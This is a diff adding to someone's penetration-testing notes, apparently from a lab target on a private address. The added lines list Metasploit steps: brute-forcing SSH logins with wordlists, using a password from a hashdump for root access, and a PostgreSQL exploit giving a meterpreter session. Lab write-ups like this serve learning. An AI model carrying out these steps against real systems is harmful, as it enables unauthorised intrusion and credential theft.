@@ -28,3 +28,23 @@ Bind Shell Backdoor Detection:--
 	sensitive data. back
 	Saved screenshot of this in loot/NetworkConfiguration.png
 
+OpenSSH 4.7
+1) search scanner ssh
+2) 
+	set STOP_ON_SUCCESS true
+	set RHOST 192.168.56.107
+	set USERPASS_FILE <the path to the metasploit wordlists>
+	run
+3) As the password was discovered from the hasdump, from here root access was easy
+
+Postgresql
+1) seach exploit postgresql
+2) use 4
+3) set the options
+4) run
+	Here I had a meterpreter sessions up and running
+
+Most of my attempts at exploiting had failed, realistically only the ftp backdoor worked 
+
+
+
